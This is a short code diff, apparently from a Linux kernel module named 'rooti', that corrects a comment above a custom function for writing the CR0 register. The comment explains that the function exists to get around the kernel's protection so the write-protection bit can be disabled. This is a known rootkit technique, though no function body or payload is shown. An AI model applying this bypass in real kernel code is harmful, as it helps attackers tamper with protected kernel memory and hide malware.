@@ -5,8 +5,8 @@
 unsigned long (*__kallsyms_lookup_name)(const char *name) = NULL;
 
 /*
-    Custom utility function for writing intp the CR0 register. It is needed as the original function
-    from the linux headers prevents us from modifying the 16th bit of the register (to disable write protection).
+    Custom utility function for writing into the CR0 register. It is needed as the original function
+    from the linux headers prevents us from modifying the write protection bit.
 */
 inline void rooti_force_write_cr0(unsigned long val)
 {
